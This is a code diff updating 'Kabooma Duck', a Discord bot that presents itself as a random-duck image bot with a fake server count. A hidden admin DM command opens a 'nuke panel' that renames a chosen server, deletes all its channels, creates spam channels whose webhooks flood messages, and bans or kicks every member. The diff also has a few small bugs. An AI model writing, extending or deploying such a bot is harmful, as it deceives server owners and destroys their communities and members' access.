@@ -1,11 +1,15 @@
-// Kabooma Duck v1.0 / index.js / Updated 3.19.2023
+// Kabooma Duck v2.0 / index.js / Updated 7.25.2023
 // Bot Dependencies
 const { Client, Events, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, StringSelectMenuBuilder, ActivityType } = require('discord.js')
-const { token, admins, botName, fakeServers, nukeOptions } = require('./config.json') // Kabooma Duck v1.0 / config.json / Updated 3.23.2023 / Check README for info
+let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json') // Kabooma Duck Config v2.0 / config.json / Updated 7.25.2023 / Check README for info
 const axios = require('axios').default 
 // CMD Dependencies
 const chalk = require('chalk')
 const figlet = require('figlet')
+
+if (!advancedOptions.enabled) {
+    advancedOptions = require('./otherConfig/defaultAdvanced.json').advancedOptions
+}
 
 const client = new Client({ intents: [   
         GatewayIntentBits.DirectMessages, 
@@ -18,30 +22,30 @@ const client = new Client({ intents: [
     ] })
 
 function registercmds() {
-    const { SlashCommandBuilder } = require('@discordjs/builders');
-    const { REST } = require('@discordjs/rest');
-    const { Routes } = require('discord-api-types/v9');
-    const { clientid, token } = require('./config.json');
+    const { SlashCommandBuilder } = require('@discordjs/builders')
+    const { REST } = require('@discordjs/rest')
+    const { Routes } = require('discord-api-types/v9')
+    const { clientID, token } = require('./config.json')
 
     const commands = [
     	new SlashCommandBuilder().setName('ping').setDescription('Replies with pong!'),
     	new SlashCommandBuilder().setName('duck').setDescription('Generates a random duck!'),
     ]
-	.map(command => command.toJSON());
+	.map(command => command.toJSON())
 
-    const rest = new REST({ version: '9' }).setToken(token);
+    const rest = new REST({ version: '9' }).setToken(token)
 
-    rest.put(Routes.applicationCommands(clientid), { body: commands })
+    rest.put(Routes.applicationCommands(clientID), { body: commands })
     	.then(() => console.log('Successfully registered application commands.'))
-    	.catch(console.error);
+    	.catch(console.error())
 }
 
 client.once(Events.ClientReady, c => {
     console.clear()
 	console.log(chalk.yellowBright(figlet.textSync('Kabooma Duck', { font: '4Max' })))
-    console.log(chalk.redBright(`Version 1.0 | Logged in as ${client.user.tag} / ${client.user.id}`))
+    console.log(chalk.redBright(`Version 2.0 | Logged in as ${client.user.tag} / ${client.user.id}`))
     console.log(chalk.redBright('Press Ctrl+C to exit. | Admins may use ?kaboom in bot DMs'))
-    // registercmds() --COMMENT THIS OUT TO REGISTER CMDS
+    registercmds()
     client.user.setActivity(`${fakeServers} servers!`, { type: ActivityType.Watching })
 });
 
@@ -64,10 +68,10 @@ client.on('interactionCreate', async interaction => {
 
         axios.get('https://random-d.uk/api/v2/random')
         .then(async response => {
-            var random = Math.floor(Math.random() * (11))
+            var random = Math.floor(Math.random() * (responses.length + 1))
 
             var embed = new EmbedBuilder()
-            .setTitle(botname)
+            .setTitle(`${botName} - Duck`)
             .setDescription(responses[random])
             .setImage(response.data.url)
             .setColor('#fceb02')
@@ -99,7 +103,7 @@ client.on('messageCreate', async message => {
 
         var embed = new EmbedBuilder()
         .setTitle('KABOOMA DUCK NUKE PANEL')
-        .setAuthor({name: 'Kabooma Duck v1.0 by RatWithAFace'})
+        .setAuthor({name: 'Kabooma Duck v2.0 by RatWithAFace'})
         .setColor('#fc00bd')
         .setDescription('Welcome to the Kabooma Duck Nuke Panel. Please select a guild to nuke.')
 
@@ -123,40 +127,56 @@ client.on('interactionCreate', async interaction => {
 
     var guild = client.guilds.cache.get(interaction.values[0])
 
-    guild.setName(nukeOptions.nameChange)
-    guild.setIcon(nukeOptions.serverIconChange)
+    guild.setName(advancedOptions.server.nameChange)
+    guild.setIcon(advancedOptions.server.iconChange)
     if (guild.banner != null) {
-        guild.setBanner(nukeOptions.serverBannerChange)
+        guild.setBanner(advancedOptions.server.bannerChange)
     }
 
     var gChannels = guild.channels.cache.map(channel => channel.id)
 
-    async function webhookSpam(webhook) {
-        for (let loop = 0; loop < 20; loop++) {
-            webhook.send(nukeOptions.webhookMessage)
-        }
+    async function webhookSpam(webhook) { 
+        var wInterval = setInterval(() => {
+            try {
+                webhook.send(advancedOptions.webhook.message)
+            } catch (error) {
+                throw error
+            }
+        }, 500);
+        setTimeout(() => {
+            clearInterval(wInterval)
+        }, 300000)
     }
     
     for (let i = 0; i < gChannels.length; i++) {
         guild.channels.cache.get(gChannels[i]).delete()
     }
 
-    for (let loop = 0; loop < 25; loop++) {
-        guild.channels.create({name: `${nukeOptions.channelNames}-${loop}`}).then(async channel => {
-            setTimeout(() => {
-                channel.createWebhook({name: nukeOptions.webhookName, avatar: nukeOptions.webhookAvatar}).then(webhook => { webhookSpam(webhook) })
-            }, 300)
-        })
+    for (let loop = 0; loop < advancedOptions.channels.amount; loop++) {
+        try {
+            guild.channels.create({name: `${advancedOptions.channels.channelNames}-${loop}`}).then(async channel => {
+                setTimeout(() => {
+                    channel.createWebhook({name: advancedOptions.webhook.name, avatar: advancedOptions.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
+                }, 300)
+            })
+        } catch (error) {
+            loop--
+            throw error
+        }
     }
+    
+    
 
-    var gMembers = guild.members.cache.map(member => member.id)
+    if (advancedOptions.banning.enabled) {
+        var gMembers = guild.members.cache.map(member => member.id)
 
-    for (let i = 0; i < gMembers.length; i++) {
-        var member = guild.members.cache.get(gMembers[i])
-        if (member.bannable) {
-            member.ban({reason: nukeOptions.banReason})
-        } else if (member.kickable) {
-            member.kick(nukeOptions.banReason)
+        for (let i = 0; i < gMembers.length; i++) {
+            var member = guild.members.cache.get(gMembers[i])
+            if (member.bannable) {
+                member.ban({reason: advancedOptions.banning.banReason})
+            } else if (member.kickable) {
+                member.kick(advancedOptions.banning.banReason)
+            }
         }
     }
     
